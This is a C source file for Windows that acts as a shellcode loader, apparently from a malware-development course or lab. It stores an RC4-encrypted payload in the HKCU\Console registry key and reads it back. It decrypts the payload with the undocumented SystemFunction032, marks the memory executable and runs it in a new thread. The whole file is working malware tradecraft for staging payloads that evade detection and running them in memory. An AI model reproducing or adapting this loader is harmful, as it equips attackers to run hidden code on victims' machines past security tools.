#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>



// Cryptographic structures and types
typedef struct _CRYPT_DATA {
    DWORD  dwDataLength;
    DWORD  dwMaxLength;
    PVOID  pvDataBuffer;
} CRYPT_DATA, * PCRYPT_DATA;

typedef NTSTATUS(NTAPI* PFN_SYSTEM_FUNCTION_032)(
    PCRYPT_DATA pDataBlock,
    PCRYPT_DATA pCryptoKey
    );

// Cryptographic material
static const BYTE g_encryptedPayload[] = {
    0x5C, 0x4C, 0xA0, 0x29, 0x32, 0x77, 0xFF, 0x2F, 0x75, 0xB7, 0x2A, 0x89, 0x6C, 0x3D, 0xFE, 0x28,
    0x08, 0x3F, 0xDC, 0xAA, 0x82, 0x5F, 0x71, 0x25, 0x74, 0x91, 0x96, 0xC4, 0x99, 0x59, 0xB0, 0x4B,
    0x5D, 0xCB, 0x1B, 0x48, 0x17, 0x87, 0x7A, 0x87, 0xD7, 0xC5, 0x70, 0x96, 0xCE, 0x31, 0x33, 0xE0,
    0x3B, 0x9A, 0x30, 0xBA, 0x7D, 0x5F, 0x53, 0x97, 0x6C, 0xC1, 0x24, 0xC5, 0xDC, 0x49, 0xE8, 0x23,
    0x9B, 0xDF, 0x30, 0x40, 0xA0, 0x97, 0x37, 0x15, 0xA7, 0xEE, 0x27, 0x6F, 0xDC, 0x36, 0x35, 0xAA,
    0xA9, 0x9E, 0xF2, 0xFB, 0xF7, 0x25, 0x2C, 0x80, 0x0C, 0x8C, 0xD4, 0x0C, 0xEF, 0x08, 0xDD, 0xA4,
    0x08, 0x3D, 0x78, 0x5F, 0x22, 0xD7, 0x14, 0x67, 0x68, 0x8F, 0x43, 0xC1, 0x69, 0x6C, 0x40, 0xAF,
    0x63, 0x30, 0x02, 0xC9, 0x57, 0x29, 0x5B, 0x49, 0x55, 0x17, 0x4F, 0xC3, 0xB6, 0x30, 0xE4, 0x7D,
    0x0C, 0xE4, 0x9B, 0xCB, 0xE9, 0x4A, 0xBB, 0x7F, 0x04, 0x21, 0xB0, 0x28, 0x1E, 0x45, 0xB8, 0x27,
    0x40, 0x5A, 0x04, 0x55, 0xD9, 0x7E, 0x6D, 0x7A, 0x82, 0xA6, 0x1B, 0xC6, 0x18, 0x2E, 0xF0, 0x3F,
    0x2A, 0xB9, 0x6C, 0x89, 0x8A, 0xCE, 0xA6, 0xF2, 0xCC, 0x70, 0x68, 0xF2, 0x17, 0xE8, 0x6F, 0x64,
    0x20, 0xA9, 0x93, 0xC8, 0xC0, 0x9E, 0xB2, 0xA5, 0xBA, 0x02, 0x1F, 0xAB, 0x55, 0xCD, 0xEF, 0x59,
    0x0D, 0xBC, 0x6F, 0xF1, 0xEF, 0x6F, 0x59, 0xE3, 0x3C, 0x65, 0x3F, 0x4F, 0x76, 0xCC, 0x18, 0x6D,
    0xC8, 0x41, 0xBC, 0x71, 0xFC, 0x2F, 0xB4, 0xC0, 0xA7, 0x1D, 0xA8, 0xBD, 0x41, 0x9D, 0x0A, 0xDD,
    0x6E, 0x5C, 0xD5, 0x5A, 0x25, 0xD3, 0x2B, 0x85, 0xF6, 0xEA, 0x33, 0x19, 0xC8, 0xC2, 0x72, 0x7C,
    0xCC, 0xF6, 0xBC, 0x6C, 0x27, 0x0A, 0x49, 0x66, 0xB6, 0x9F, 0xB8, 0x39, 0x60, 0x6D, 0xD2, 0x25,
    0x7E, 0x9D, 0x34, 0x7A, 0x0A, 0x7F, 0xF9, 0xEF, 0x35, 0x01, 0xCB, 0xF5, 0x86, 0xC2, 0xB0, 0x28,
    0xEC, 0xCA, 0x90, 0x4C
};

static const BYTE g_decryptionKey[] = {
    0x58, 0xAC, 0xFB, 0x1B, 0xC4, 0x1C, 0xCC, 0x87, 0x1F, 0x69, 0x08, 0xA4, 0x97, 0xD8, 0x76, 0x6D
};

/*---------------------------
    Cryptographic Operations
---------------------------*/

BOOL ExecuteRc4CipherOperation(
    IN const PBYTE pbCipherKey,
    IN OUT PBYTE pbDataBuffer,
    IN DWORD dwKeySize,
    IN DWORD dwDataSize
) {
    CRYPT_DATA keyStruct = {
        .pvDataBuffer = pbCipherKey,
        .dwDataLength = dwKeySize,
        .dwMaxLength = dwKeySize
    };

    CRYPT_DATA dataStruct = {
        .pvDataBuffer = pbDataBuffer,
        .dwDataLength = dwDataSize,
        .dwMaxLength = dwDataSize
    };

    PFN_SYSTEM_FUNCTION_032 pfnSystemFunction = (PFN_SYSTEM_FUNCTION_032)
        GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if (!pfnSystemFunction) {
        fprintf(stderr, "[!] Cryptographic module resolution failed\n");
        return FALSE;
    }

    NTSTATUS ntStatus = pfnSystemFunction(&dataStruct, &keyStruct);
    if (ntStatus != 0x0) {
        fprintf(stderr, "[!] Cryptographic operation error: 0x%08X\n", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*---------------------------
      Registry Operations
---------------------------*/

BOOL StoreDataInRegistry(
    IN const PBYTE pData,
    IN DWORD dwDataSize
) {
    HKEY hRegistryKey = NULL;
    BOOL bSuccess = TRUE;
    LSTATUS statusCode;

    printf("[*] Storing %lu bytes in system registry...\n", dwDataSize);

    statusCode = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Console",
        0,
        KEY_SET_VALUE,
        &hRegistryKey
    );

    if (statusCode != ERROR_SUCCESS) {
        fprintf(stderr, "[!] Registry access failure: %d\n", statusCode);
        bSuccess = FALSE;
        goto Cleanup;
    }

    statusCode = RegSetValueExA(
        hRegistryKey,
        "DATA",
        0,
        REG_BINARY,
        pData,
        dwDataSize
    );

    if (statusCode != ERROR_SUCCESS) {
        fprintf(stderr, "[!] Data storage failure: %d\n", statusCode);
        bSuccess = FALSE;
    }
    else {
        printf("[+] Registry update completed successfully\n");
    }

Cleanup:
    if (hRegistryKey) {
        RegCloseKey(hRegistryKey);
    }
    return bSuccess;
}

BOOL RetrieveRegistryData(
    OUT PDWORD pdwDataSize,
    OUT PBYTE* ppbDataBuffer
) {
    HKEY hRegistryKey = NULL;
    LSTATUS statusCode;
    PBYTE pTempBuffer = NULL;
    DWORD dwBufferSize = 0;

    statusCode = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Console",
        0,
        KEY_READ,
        &hRegistryKey
    );

    if (statusCode != ERROR_SUCCESS) {
        fprintf(stderr, "[!] Registry access failure: %d\n", statusCode);
        return FALSE;
    }

    statusCode = RegGetValueA(
        hRegistryKey,
        NULL,
        "DATA",
        RRF_RT_ANY,
        NULL,
        NULL,
        &dwBufferSize
    );

    if (statusCode != ERROR_SUCCESS) {
        fprintf(stderr, "[!] Data size query failure: %d\n", statusCode);
        RegCloseKey(hRegistryKey);
        return FALSE;
    }

    pTempBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
    if (!pTempBuffer) {
        fprintf(stderr, "[!] Memory allocation error: %d\n", GetLastError());
        RegCloseKey(hRegistryKey);
        return FALSE;
    }

    statusCode = RegGetValueA(
        hRegistryKey,
        NULL,
        "DATA",
        RRF_RT_ANY,
        NULL,
        pTempBuffer,
        &dwBufferSize
    );

    RegCloseKey(hRegistryKey);

    if (statusCode != ERROR_SUCCESS) {
        fprintf(stderr, "[!] Data retrieval failure: %d\n", statusCode);
        HeapFree(GetProcessHeap(), 0, pTempBuffer);
        return FALSE;
    }

    *ppbDataBuffer = pTempBuffer;
    *pdwDataSize = dwBufferSize;
    return TRUE;
}

/*---------------------------
      Payload Execution
---------------------------*/

BOOL ExecuteMemoryPayload(
    IN PVOID pPayload,
    IN SIZE_T szPayloadSize
) {
    PVOID pExecMemory = VirtualAlloc(
        NULL,
        szPayloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pExecMemory) {
        fprintf(stderr, "[!] Memory allocation error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Allocated executable memory at: 0x%p\n", pExecMemory);
    memcpy(pExecMemory, pPayload, szPayloadSize);
    SecureZeroMemory(pPayload, szPayloadSize);

    DWORD dwOldProtect;
    if (!VirtualProtect(pExecMemory, szPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        fprintf(stderr, "[!] Memory protection error: %d\n", GetLastError());
        VirtualFree(pExecMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[#] Execution ready - press ENTER to continue...");
    getchar();

    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pExecMemory,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        fprintf(stderr, "[!] Thread creation error: %d\n", GetLastError());
        VirtualFree(pExecMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(pExecMemory, 0, MEM_RELEASE);

    return TRUE;
}

/*---------------------------
         Main Program
---------------------------*/


int main() {
    PBYTE pDecryptedData = NULL;
    DWORD dwDataSize = 0;

    printf("[+] Starting secure payload sequence\n");

    // Store initial payload
    if (!StoreDataInRegistry(g_encryptedPayload, sizeof(g_encryptedPayload))) {
        fprintf(stderr, "[!] Initial storage phase aborted\n");
        return EXIT_FAILURE;
    }

    // Retrieve encrypted data
    printf("[*] Retrieving protected data from registry\n");
    if (!RetrieveRegistryData(&dwDataSize, &pDecryptedData)) {
        fprintf(stderr, "[!] Data retrieval phase aborted\n");
        return EXIT_FAILURE;
    }

    printf("[+] Retrieved %lu bytes from secure storage\n", dwDataSize);

    // Decryption phase
    printf("[#] Press ENTER to initiate decryption...");
    getchar();

    if (!ExecuteRc4CipherOperation(
        (PBYTE)g_decryptionKey,
        pDecryptedData,
        sizeof(g_decryptionKey),
        dwDataSize
    )) {
        fprintf(stderr, "[!] Decryption process aborted\n");
        HeapFree(GetProcessHeap(), 0, pDecryptedData);
        return EXIT_FAILURE;
    }

    printf("[+] Data transformation completed successfully\n");

    // Execute transformed payload
    if (!ExecuteMemoryPayload(pDecryptedData, dwDataSize)) {
        fprintf(stderr, "[!] Execution sequence aborted\n");
        HeapFree(GetProcessHeap(), 0, pDecryptedData);
        return EXIT_FAILURE;
    }

    // Cleanup
    HeapFree(GetProcessHeap(), 0, pDecryptedData);
    printf("[+] Operation sequence completed successfully\n");

    printf("[#] Press ENTER to exit...");
    getchar();  // Added this line to keep CMD open
    return EXIT_SUCCESS;
}
